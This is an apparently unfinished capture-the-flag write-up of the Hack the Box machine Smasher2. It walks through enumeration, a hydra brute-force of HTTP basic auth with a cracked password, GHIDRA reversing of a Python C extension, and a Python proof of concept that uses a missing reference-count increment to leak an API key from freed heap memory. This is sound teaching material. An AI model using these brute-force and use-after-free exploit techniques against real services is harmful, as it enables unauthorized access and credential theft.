---
layout: post
title:  "Hack the Box - Smasher2"
date:   2018-10-01 16:16:01 -0600
categories: hackthebox python heap internals py_decref py_incref reversing hacking writeup
---

<img class="header-img" src="{{ "img/smasher2/home.png" | relative_url }}" />

The start of this box requires very basic enumeration:
1. `nmap`, discover port `53` and `80`
2. `dirb` port 80, discover `/backup`
3. `dig AXFR smasher2.htb @smasher2.htb`, discover `wonderfulsessionmanager.smasher2.htb`

`/backup` is protected by Basic HTTP auth, and we don't have any hints to a username; however, basic fuzzing of `wonderfulsessionmanager.smasher2.htb` doesn't bring up any leads. So, kick off `hydra` against `/backup` with a username of `admin`, a password list of `rockyou.txt`, and grab yourself a beer. After an hour or two we get lucky and find the password: `clarabibi`. 

[note: frankly, this part of the box is quite lame, and I wouldn't really ever recommended bruteforcing HTTP authentication with such a huge password list, especially without a known username.]

Once logged in, we have access to two files: `auth.py`, and `ses.so`, a shared object library loaded from the Python module. This is what powers `wonderfulsessionmanager.smasher2.htb`. Unfortunately (or fortunately), `auth.py` has its credentials removed, so some reversing is in order. 

`auth.py` is a very basically Flask application that has endpoints to login and to execute jobs via `bash`. In order to use the latter, one must have an API key which is a function of the username and password needed to log in -- it is also provided to users who log in successfully. There are no obvious bugs, or exploitable issues with the Flask app (session keys are generated securely), so the `ses.so` file needs a look.

The easiest way to begin to approach reversing is usually with static analysis. This has because much easier for those of us without tens of thousands of dollars to spend on IDA Pro lately with the release of [GHIDRA](https://ghidra-sre.org). GHIDRA is a free reverse engineering tool from the NSA with a pretty powerful disassembler / decompiler. 

After loading the file in GHIDRA (or any other tool), start by looking for the most important looking functions in the `Functions` window. In our case, those would be the two functions called from the Flask app - `SessionManager__init`, and `SessionManager_check_login`. After a quick glance at `SessionManager__init`, it turns out to be innocuous, so the focus falls upon SessionManager_check_login`. it's helpful to break apart the program and start to name variables as you discover their use throughout the program. Here is what GHIDRA looked like for me after my first pass: 

{% highlight c %}
long * SessionManager_check_login(undefined8 uParm1,undefined8 uParm2)

{
  long lVar1;
  undefined8 *puVar2;
  char has_data;
  char user_is_blocked;
  char data_has_username;
  char data_has_password;
  char user_can_login;
  int arguments;
  int user_login_count;
  int user_login_count_2;
  int username_matches;
  int password_matches;
  long *return_list;
  long *data;
  undefined8 username_raw;
  undefined8 password_raw;
  char *username;
  char *password;
  char *private_username;
  char *private_password;
  long *plVar3;
  long in_FS_OFFSET;
  undefined8 session_manager.self;
  long *post_data;
  long *local1;
  
  lVar1 = *(long *)(in_FS_OFFSET + 0x28);
  return_list = (long *)PyList_New(2);
  arguments = PyArg_ParseTuple(uParm2,&OO,&session_manager.self,&post_data);
  if (arguments == 0) {
    return_list = (long *)0x0;
    goto LAB_0010250e;
  }
  if ((*(ulong *)(post_data[1] + 0xa8) & 0x20000000) == 0) {
    *post_data = *post_data + -1;
    if (*post_data == 0) {
      (**(code **)(post_data[1] + 0x30))(post_data);
    }
    return_list = (long *)ErrorMsg(PyExc_TypeError,"Expecting a dict!",uParm2);
    goto LAB_0010250e;
  }
  has_data = dict_contains(post_data,&data);
  if (has_data != '\x01') {
    *post_data = *post_data + -1;
    if (*post_data == 0) {
      (**(code **)(post_data[1] + 0x30))(post_data);
    }
    return_list = (long *)ErrorMsg(PyExc_TypeError,"Missing data parameter",uParm2);
    goto LAB_0010250e;
  }
  data = (long *)get_dict_key(post_data,&data);
  user_is_blocked = is_blocked(session_manager.self);
  if (user_is_blocked == '\x01') {
    user_can_login = can_login(session_manager.self);
    if (user_can_login != '\0') {
      set_unblocked(session_manager.self);
      set_login_count(session_manager.self,0);
    }
    plVar3 = (long *)PyBool_FromLong(0);
    *plVar3 = *plVar3 + 1;
    *(long **)return_list[3] = plVar3;
    *data = *data + 1;
    *(long **)(return_list[3] + 8) = data;
  }
  else {
    user_login_count = get_login_count(session_manager.self);
    if (user_login_count < 10) {
      set_last_login(session_manager.self);
      user_login_count_2 = get_login_count(session_manager.self);
      set_login_count(session_manager.self,(long)(user_login_count_2 + 1),
                      (long)(user_login_count_2 + 1));
      if ((*(ulong *)(data[1] + 0xa8) & 0x20000000) == 0) {
        *post_data = *post_data + -1;
        if (*post_data == 0) {
          (**(code **)(post_data[1] + 0x30))(post_data);
        }
        return_list = (long *)ErrorMsg(PyExc_TypeError,"Expect dict paramenter",uParm2);
        goto LAB_0010250e;
      }
      data_has_username = dict_contains(data,"username");
      if (data_has_username != '\x01') {
        *post_data = *post_data + -1;
        if (*post_data == 0) {
          (**(code **)(post_data[1] + 0x30))(post_data);
        }
        return_list = (long *)ErrorMsg(PyExc_TypeError,"Missing username parameter",uParm2);
        goto LAB_0010250e;
      }
      data_has_password = dict_contains(data,"password");
      if (data_has_password != '\x01') {
        *post_data = *post_data + -1;
        if (*post_data == 0) {
          (**(code **)(post_data[1] + 0x30))(post_data);
        }
        return_list = (long *)ErrorMsg(PyExc_TypeError,"Missing password parameter",uParm2);
        goto LAB_0010250e;
      }
      username_raw = get_dict_key(data,"username");
      password_raw = get_dict_key(data,"password");
      username = (char *)PyString_AsString(username_raw);
      password = (char *)PyString_AsString(password_raw);
      private_username = (char *)get_internal_usr(session_manager.self);
      username_matches = strcmp(username,private_username);
      if (username_matches == 0) {
        private_password = (char *)get_internal_pwd(session_manager.self);
        password_matches = strcmp(password,private_password);
        if (password_matches == 0) {
          puVar2 = (undefined8 *)return_list[3];
          username_raw = PyBool_FromLong(1);
          *puVar2 = username_raw;
          *data = *data + 1;
          *(long **)(return_list[3] + 8) = data;
          goto LAB_001024c5;
        }
      }
      puVar2 = (undefined8 *)return_list[3];
      username_raw = PyBool_FromLong(0);
      *puVar2 = username_raw;
      *data = *data + 1;
      *(long **)(return_list[3] + 8) = data;
    }
    else {
      set_blocked(session_manager.self);
      plVar3 = (long *)PyBool_FromLong(1);
      *plVar3 = *plVar3 + 1;
      puVar2 = (undefined8 *)return_list[3];
      username_raw = PyBool_FromLong(0);
      *puVar2 = username_raw;
      *(long **)(return_list[3] + 8) = data;
    }
  }
LAB_001024c5:
  *data = *data + -1;
  if (*data == 0) {
    (**(code **)(data[1] + 0x30))(data);
  }
  *return_list = *return_list + 1;
LAB_0010250e:
  if (lVar1 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return return_list;
}
{% endhighlight %}

Doing this makes spotting potential issues much easier. There are a few functions called within this method that can be explored as well: `set_blocked`, `get_login_count`, `set_unblocked`, `set_login_count`, `can_login`, `set_last_login`, `get_internal_pwd`, and `get_internal_user`. Pretty much all of these are basic getter or setter methods, including `get_internal_pwd`, and `get_internal_user`, but there's something interesting about those two:

{% highlight c %}
undefined8 get_internal_pwd(undefined8 uParm1)

{
  long *plVar1;
  undefined8 uVar2;
  
  plVar1 = (long *)PyObject_GetAttrString(uParm1,"user_login");
  uVar2 = PyList_GetItem(plVar1,0);
  uVar2 = PyString_AsString(uVar2);
  *plVar1 = *plVar1 + -1;
  if (*plVar1 == 0) {
    (**(code **)(plVar1[1] + 0x30))(plVar1);
  }
  return uVar2;
}

undefined8 get_internal_usr(undefined8 uParm1)

{
  long *plVar1;
  undefined8 uVar2;
  
  plVar1 = (long *)PyObject_GetAttrString(uParm1,"user_login");
  uVar2 = PyList_GetItem(plVar1,0);
  uVar2 = PyString_AsString(uVar2);
  *plVar1 = *plVar1 + -1;
  if (*plVar1 == 0) {
    (**(code **)(plVar1[1] + 0x30))(plVar1);
  }
  return uVar2;
}
{% endhighlight %}

Can you spot the difference? If not, that's the point -- `get_internal_pwd` is actually returning the internal username. This makes bruteforcing _much_ easier, as you only have to guess the correct username and you're in. However, this was an unintended bug that may eventually change, so let's keep digging and find the real solution.

At this point, there isn't anything _super_ obvious sticking out, so it's time to fire up some dynamic analysis and fuzzing. We have pretty much everything needed, we just need to create a `templates` directory with an `index.html` and `login.html` to keep Flask happy. From there, one can simple run `python auth.py`. 

The first idea I had was (type confusion)[https://cwe.mitre.org/data/definitions/843.html]. Although this is a common route to exploit interpretered language interop, `ses.so` had pretty robust type checking. Passing `{"data": []}`, `{}`, `{"data":{}}`, etc. all resulted in valid, safe exits. After poking around a little more, I found that `{"data": {"username": [], "password": "X"}}` caused a crash! 

Now that we were onto something, it's time to break out `gdb` to see what's happening. In a separate terminal, we connect to the running application. A simple shell command I use to make attaching to the running PID easy: `gdb python $(ps aux | grep auth.py | grep -v grep | awk '{print $2}')`. Once attached, we can set breakpoints as in any other application, e.g. `break *SessionManager_check_login+1110`.

We can also simply load the `core` file from the `SIGSEV` via `gdb python core`, and inspect our stack at crash time via `i stack`:
{% highlight shell %}
gdb-peda$ i stack
#0  __strcmp_avx2 () at ../sysdeps/x86_64/multiarch/strcmp-avx2.S:101
#1  0x00007f5066d9b347 in SessionManager_check_login ()
   from /root/Documents/smasher2/ses.so
#2  0x000055d164414e5a in PyEval_EvalFrameEx ()
...
{% endlight %}

Unfortunately, based on the stack, this doesn't look easily exploitable. If we look at the code where this is happening:
{% highlight c %}
username_raw = get_dict_key(data,"username");
password_raw = get_dict_key(data,"password");
username = (char *)PyString_AsString(username_raw);
password = (char *)PyString_AsString(password_raw);
private_username = (char *)get_internal_usr(session_manager.self);
username_matches = strcmp(username,private_username);
{% endhighlight %}
We can see our list that we passed as `username` is getting passed into `PyString_AsString`. The (documentation)[https://docs.python.org/2/c-api/string.html#c.PyString_AsString] for this method makes it pretty clear what's happening. Since `username_raw` is not a `PyString`, `PyString_AsString` is returning `NULL`, and `strcmp` is failed since it's first parameter, `username`, is `NULL`. Hrm, back to the drawing board.

I didn't want to completely give up on type confusion, so my next step was to look for potential code paths where our `data` dictionary's type wasn't checked, or was still used after it was checked. There were two scenarios where that could happen:
1. If the user is blocked
2. If the user is _about_ to be blocked

The only problem is that `data` is not actually used in any of those code paths, other than to be returned so it can be presented in the error message, but in investigating those two areas of the code, something _very_ interesting pops out:
{% highlight c %}
  ...
  user_can_login = can_login(session_manager.self);
  if (user_can_login != '\0') {
    set_unblocked(session_manager.self);
    set_login_count(session_manager.self,0);
  }
  plVar3 = (long *)PyBool_FromLong(0);
  *plVar3 = *plVar3 + 1;
  *(long **)return_list[3] = plVar3;
  *data = *data + 1;
  *(long **)(return_list[3] + 8) = data;

  ...

  set_blocked(session_manager.self);
  plVar3 = (long *)PyBool_FromLong(1);
  *plVar3 = *plVar3 + 1;
  puVar2 = (undefined8 *)return_list[3];
  username_raw = PyBool_FromLong(0);
  *puVar2 = username_raw;
  *(long **)(return_list[3] + 8) = data;
  ...
{% endhighlight %}
Notice the line `*data = *data + 1;` which is missing in the second code path. Further investigating shows that every other non-exception based code path _also_ has that line. So, what's it for? Time to dive into (Python internals)[https://docs.python.org/2.7/c-api/index.html].

Python uses (reference counting)[https://docs.python.org/2.7/c-api/refcounting.html] in addition to garbage collection. Reference counting is a way for the Python runtime to determine when it's safe to deallocate objects. Once an object's reference count hits 0, the object’s type’s deallocation function is invoked. These counts are increased by the `Py_INCREF` macro, and decreased by the `Py_DECREF` macro. 

In our case, `*data = *data + 1;` is `Py_INCREF` increasing the number of references to our `data` dictionary, since it's being put into the `return_list` variable, and so it shouldn't be deallocated. However, the same thing is happening in the other code path, but there is no `Py_INCREF`! Furthermore, all of this code ends up hitting this:
{% highlight c %}
*data = *data + -1;
if (*data == 0) {
  (**(code **)(data[1] + 0x30))(data);
}
{% endhighlight %}
Can you guess what that is? It's `Py_DECREF`. It's decreasing the number of references (since this function is returning and no longer needs to reference that variable), and if the number of references is `0`, it calls `(**(code **)(data[1] + 0x30))(data);` We know `data` is a dictionary, which is `PyDict_Type` in CPython. By looking at the (source)[https://github.com/python/cpython/blob/a8b89cd0611f2732491a72b37651f110fb0ed8ec/Objects/dictobject.c#L3194], we can see that `0x30` into the type structure is the deallocator, `dict_dealloc`, just as we'd expect.

Using this, we can build a quick POC:
{% highlight python %}
import requests

HOST = 'localhost'
PORT = '5000'
BASE_URL = 'http://' + HOST + ':' + PORT

init = requests.get(BASE_URL)
cookies = init.cookies.get_dict()

for i in range(10):
    exploit = requests.post(
            BASE_URL + '/auth', 
            json={"data":{"username": "aaa", "password": "aaa"}},
            headers={'Content-Type': 'application/json'}, 
            cookies=cookies
    )

exploit = requests.post(
        BASE_URL + '/auth', 
        json={"data":{}},
        headers={'Content-Type': 'application/json'}, 
        cookies=cookies
)
{% endhighlight %}
and we successfully get a crash:
{% highlight shell %}
➜  python auth.py
 * Serving Flask app "auth" (lazy loading)
 * Environment: production
   WARNING: Do not use the development server in a production environment.
   Use a production WSGI server instead.
 * Debug mode: off
 * Running on http://127.0.0.1:5000/ (Press CTRL+C to quit)
127.0.0.1 - - [04/Jun/2019 20:35:26] "GET / HTTP/1.1" 200 -
127.0.0.1 - - [04/Jun/2019 20:35:26] "POST /auth HTTP/1.1" 200 -
127.0.0.1 - - [04/Jun/2019 20:35:26] "POST /auth HTTP/1.1" 200 -
127.0.0.1 - - [04/Jun/2019 20:35:26] "POST /auth HTTP/1.1" 200 -
127.0.0.1 - - [04/Jun/2019 20:35:26] "POST /auth HTTP/1.1" 200 -
127.0.0.1 - - [04/Jun/2019 20:35:26] "POST /auth HTTP/1.1" 200 -
127.0.0.1 - - [04/Jun/2019 20:35:26] "POST /auth HTTP/1.1" 200 -
127.0.0.1 - - [04/Jun/2019 20:35:26] "POST /auth HTTP/1.1" 200 -
127.0.0.1 - - [04/Jun/2019 20:35:26] "POST /auth HTTP/1.1" 200 -
127.0.0.1 - - [04/Jun/2019 20:35:26] "POST /auth HTTP/1.1" 200 -
127.0.0.1 - - [04/Jun/2019 20:35:26] "POST /auth HTTP/1.1" 200 -
Fatal Python error: deletion of interned string failed
[1]    21191 segmentation fault (core dumped)  python auth.py
{% endhighlight %}
Ok, so we seem to have some sort of heap-based SIGSEV. The dictionary that Python is expected to be there is now `free`'d / deallocated, and its causing a crash. How can we exploit this? We gotta (dive deeper)[https://docs.python.org/2.7/c-api/memory.html].

A couple important facts on Python:
1. Everything on Python is managed on a private heap, managed internally by Python
2. Python's memory manager has different segments for each type of object. So integers, lists, dictionaries, etc. are all managed differently, but together, within the private heap
3. These separate areas are managed as (or like) (fast bins)[https://heap-exploitation.dhavalkapil.com/diving_into_glibc_heap/bins_chunks.html#fast-bins]: last in, first out. Once an object is deallocated, the pointer to the heap moves back the size of that object (plus metadata).
4. This can be seen by reviewing the source code for (various)[https://github.com/python/cpython/blob/master/Objects/dictobject.c#L1974] (deallocators)[https://github.com/python/cpython/blob/master/Objects/listobject.c#L360] -- if there is space on the `free_list`, it adds the pointer to the deallocated object to the `free_list` for that type of object.
 
Knowing all of this, we can successfully exploit this code, or at least potentially read items we shouldn't be able to read. Remember: this code path does _not_ check the data type of `"data"` from our JSON. It also deallocs that type of object from memory, meaning that pointer is now pointing to a different object of the same _type_ of `"data"`. Lastly, `ses.so` returns that object to `auth.py`, which prints it to the user. So, by passing in various types of `"data"`, we can read the last item of that type created in Python's heap.

After a bit of trial and error with different object types, we get a success: `{"data": []}`:
{% highlight python %}
import requests

HOST = 'localhost'
PORT = '5000'
BASE_URL = 'http://' + HOST + ':' + PORT

init = requests.get(BASE_URL)
cookies = init.cookies.get_dict()

for i in range(10):
    exploit = requests.post(
            BASE_URL + '/auth', 
            json={"data":{"username": "aaa", "password": "aaa"}},
            headers={'Content-Type': 'application/json'}, 
            cookies=cookies
    )

exploit = requests.post(
        BASE_URL + '/auth', 
        json={"data":[]},
        headers={'Content-Type': 'application/json'}, 
        cookies=cookies
)
if '/api/<api_key>' in exploit.text:
    print(exploit.text)
{% endhighlight %}
results in
{% highlight shell %}
➜  python exploit.py
{"authenticated":false,"result":"Cannot authenticate with data: ['/api/<api_key>/job', '1e18cb7c2be07907d12f52e505404081bd902e3af0fd6fd4437275bb71d7fe15', 1559695142] - Too many tentatives, wait 2 minutes!"}
{% end highlight %}
The last `list` loaded onto Python's heap before the list we send is the list used to initiate the `SessionManager`, which contains the API key we need!

We can verify this in `gdb` by stepping through the deallocation code. In one terminal, start our local Flask server: `python auth.py`. In another, connect to it via `gdb`: `gdb python $(ps aux | grep auth.py | grep -v grep | awk '{print $2}')`. Set a breakpoint on the deallocation call: `break* SessionManager_check_login+1281`, and continue the program: `c`. In another terminal, kick off our exploit: `python exploit.py` and go back to the `gdb` window. Step into the `list_dealloc` function with `s`. 

`gdb` makes it really easy to debug Python objects. We can cast objects to `PyObject*` to view their data and members, print local variable names like `op`, and more. (list_dealloc)[https://github.com/python/cpython/blob/master/Objects/listobject.c#L360] has a local variable `op`, which is the `PyListObject*` we're deallocating:
{% highlight shell %}
gdb-peda$ p (*(PyListObject*)op)
$23 = {
  ob_refcnt = 0x0, 
  ob_type = 0x55bbf70e2280 <PyList_Type>, 
  ob_size = 0x0, 
  ob_item = 0x0, 
  allocated = 0x0
}
{% endhighlight %}
Futhermore, `PyListObject` inherits from `PyObject`, which we can find implemented (here)[https://github.com/python/cpython/blob/master/Include/object.h#L104]. Clearly this struct has more members above `ob_refcnt`, via the define `_PyObject_HEAD_EXTRA`. This defines extra pointers to support a doubly-linked list of all live heap objects. So, looking at the start of `list_dealloc`:
{% highlight shell %}
0x000055bbf6e7ebe2 <+18>:	mov    rdx,QWORD PTR [rdi-0x20]
0x000055bbf6e7ebe6 <+22>:	mov    rcx,QWORD PTR [rdi-0x18]
{% endhighlight %}
Is the logic to retreive the forward and backwards looking pointers for the doubly-linked list, and that can be verified by inspecting the data:
{% highlight shell %}
gdb-peda$ x op-0x20
0x7f2430d34738:	0x00007f2430d31378
gdb-peda$ p *(PyObject *)(0x7f2430d31378+0x20)
$33 = {
  ob_refcnt = 0x4, 
  ob_type = 0x55bbf70e1da0 <PyDict_Type>
}
gdb-peda$ p *(PyObject *)(0x00007f2430d22d50+0x20)
$35 = {
  ob_refcnt = 0x1, 
  ob_type = 0x55bbf70deb40 <PyMethod_Type>
}
{% endhighlight %}
It then updates the `next` and `prev` pointers for the items on that list, effectively "cutting out" the object we're freeing. It then zeros out the `next` pointer for the f (if anyone can enlighten me on what the `0xfffffffffffffffe` checks and `mov`s are, I'd be fascinated to know):
{% highlight shell %}
0x000055bbf6e7ebe2 <+18>:	mov    rdx,QWORD PTR [rdi-0x20]
0x000055bbf6e7ebe6 <+22>:	mov    rcx,QWORD PTR [rdi-0x18]
0x000055bbf6e7ebea <+26>:	mov    QWORD PTR [rdi-0x10],0xfffffffffffffffe
0x000055bbf6e7ebf2 <+34>:	mov    QWORD PTR [rcx],rdx
0x000055bbf6e7ebf5 <+37>:	mov    rbx,QWORD PTR [rdi-0x20]
0x000055bbf6e7ebf9 <+41>:	mov    rsi,QWORD PTR [rdi-0x18]
0x000055bbf6e7ebfd <+45>:	mov    QWORD PTR [rbx+0x8],rsi
0x000055bbf6e7ec01 <+49>:	mov    QWORD PTR [rdi-0x20],0x0
{% endhighlight %}
It then verifies that our list is empty and continues to the `free_list` check (if it wasn't, it would have to run through the list and deallocate each item in the list -- if you want to try it, pass a non-empty list through and step through):
{% endhighlight %}
   0x55bbf6e7ecfa <list_dealloc+298>:	nop    WORD PTR [rax+rax*1+0x0]
   0x55bbf6e7ed00 <list_dealloc+304>:	
    movsxd r9,DWORD PTR [rip+0x2c0919]        # 0x55bbf713f620 <numfree.lto_priv.44>
   0x55bbf6e7ed07 <list_dealloc+311>:	mov    r10,QWORD PTR [rbp+0x8]
=> 0x55bbf6e7ed0b <list_dealloc+315>:	cmp    r9d,0x4f
   0x55bbf6e7ed0f <list_dealloc+319>:	jg     0x55bbf6e7ed40 <list_dealloc+368>
   0x55bbf6e7ed11 <list_dealloc+321>:	cmp    r10,QWORD PTR [rip+0x248090]        # 0x55bbf70c6da8
   0x55bbf6e7ed18 <list_dealloc+328>:	jne    0x55bbf6e7ed40 <list_dealloc+368>
   0x55bbf6e7ed1a <list_dealloc+330>:	lea    r11d,[r9+0x1]
gdb-peda$ p numfree
$48 = 0x3
{% endhighlight %}
Clearly, `numfree` is less than the `PyList_MAXFREELIST`, so Python will use that route, and will add the pointer to `op` to the `freelist`: `free_list[numfree++] = op;`.

As to the specifics as to _why_ the list that's passed to `SessionManager_init` needs to be re-allocated (and thus re-uses the pointer that we just freed), I'm not 100% sure. If someone is more familiar with Python internals, I would love to know. But, we can clearly see it happening if we set watchpoints on that memory in `gdb`:
{% highlight shell %}
gdb-peda$ awatch *0x7facbab56bd8  # This is the address of `op` from above, when we were in the list_dealloc function
gdb-peda$ awatch *0x7facbab56bd8-0x20
gdb-peda$ c
{% endhighlight %}
_Step through until the end of `PyList_New` completes allocation, plus assignment._
{% highlight shell %}
gdb-peda$ print *(PyListObject*)0x7facbab56bd8
$13 = {
  ob_refcnt = 0x1, 
  ob_type = 0x55d10570a280 <PyList_Type>, 
  ob_size = 0x3, 
  ob_item = 0x7facb4022b20, 
 allocated = 0x3
}

gdb-peda$ print *(PyStringObject*)(*(PyListObject*)0x7facbab56bd8)->ob_item[1]
$16 = {
  ob_refcnt = 0x2, 
  ob_type = 0x55d105709f40 <PyString_Type>, 
  ob_size = 0x40, 
  ob_shash = 0xffffffffffffffff, 
  ob_sstate = 0x0, 
  ob_sval = "1"
}
gdb-peda$ x/32s (*(PyStringObject*)(*(PyListObject*)0x7facbab56bd8)->ob_item[1])->ob_sval
0x7facbab91bb4:	"1e18cb7c2be07907d12f52e505404081bd902e3af0fd6fd4437275bb71d7fe15"
{% endhighlight %}

TODO: final part
http://derekmolloy.ie/writing-a-linux-kernel-module-part-2-a-character-device/
https://labs.mwrinfosecurity.com/publications/kernel-driver-mmap-handler-exploitation/


_fin_
